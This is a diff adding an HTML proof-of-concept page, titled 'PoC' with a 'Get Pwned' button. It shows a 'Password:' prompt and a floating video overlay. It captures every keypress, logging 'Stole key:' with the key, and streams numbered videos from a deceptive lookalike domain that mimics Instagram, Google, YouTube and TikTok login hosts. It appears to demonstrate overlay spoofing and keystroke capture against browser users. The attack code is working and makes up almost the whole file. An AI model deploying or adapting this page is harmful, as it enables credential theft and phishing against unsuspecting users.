@@ -1,0 +1,130 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>PoC</title>
+
+<style>
+body{
+  margin:0;
+  height:100vh;
+  font-family:system-ui,sans-serif;
+  background:#f2f2f2;
+}
+
+#password{
+  padding:20px;
+  font-size:18px;
+}
+
+/* LANDSCAPE container */
+.floating-video{
+  position:fixed;
+  top:50%;
+  left:50%;
+  transform:translate(-50%,-50%);
+  width:560px;      /* landscape width */
+  height:315px;     /* 16:9 height */
+  background:#000;
+  border-radius:14px;
+  box-shadow:0 25px 70px rgba(0,0,0,.5);
+  overflow:hidden;
+  display:none;
+  z-index:999;
+}
+
+.floating-video.show{
+  display:block;
+}
+
+.video-layer{
+  position:absolute;
+  inset:0;
+  opacity:0;
+}
+
+.video-layer.active{
+  opacity:1;
+}
+
+video{
+  width:100%;
+  height:100%;
+  object-fit:contain; /* keep landscape, no crop */
+  background:#000;
+}
+
+#showBtn{
+  position:fixed;
+  right:16px;
+  bottom:16px;
+  padding:10px 16px;
+  z-index:1000;
+}
+</style>
+</head>
+
+<body>
+
+<div id="password">Password:</div>
+
+<div class="floating-video" id="box">
+  <video id="v0" class="video-layer active" muted playsinline preload="auto"></video>
+  <video id="v1" class="video-layer" muted playsinline preload="auto"></video>
+</div>
+
+<button id="showBtn">Get Pwned</button>
+
+<script>
+let count = 1;
+let active = 0;
+
+const box = document.getElementById("box");
+const btn = document.getElementById("showBtn");
+const videos = [
+  document.getElementById("v0"),
+  document.getElementById("v1")
+];
+
+function firstFrame(video, cb){
+  video.play().catch(()=>{});
+  if ("requestVideoFrameCallback" in video) {
+    video.requestVideoFrameCallback(() => cb());
+  } else {
+    video.addEventListener("playing", cb, { once:true });
+  }
+}
+
+function swapInstant(src){
+  const cur = videos[active];
+  const next = videos[1 - active];
+
+  next.src = src;
+  next.load();
+
+  firstFrame(next, ()=>{
+    next.classList.add("active");
+    cur.classList.remove("active");
+    active = 1 - active;
+  });
+}
+
+btn.addEventListener("click", ()=>{
+  box.classList.add("show");
+  swapInstant("https://administrat-jawai-login-cloud-instagram-google-youtube.com-tiktok.com.lazysec.my.id/1.mp4");
+});
+
+document.addEventListener("keydown", e=>{
+  if(e.key === "Backspace"){
+    count = Math.max(1, count - 1);
+  } else {
+    count++;
+  }
+
+  console.log("Stole key:", e.key);
+  swapInstant(`https://administrat-jawai-login-cloud-instagram-google-youtube.com-tiktok.com.lazysec.my.id/${count}.mp4`);
+});
+</script>
+
+</body>
+</html>
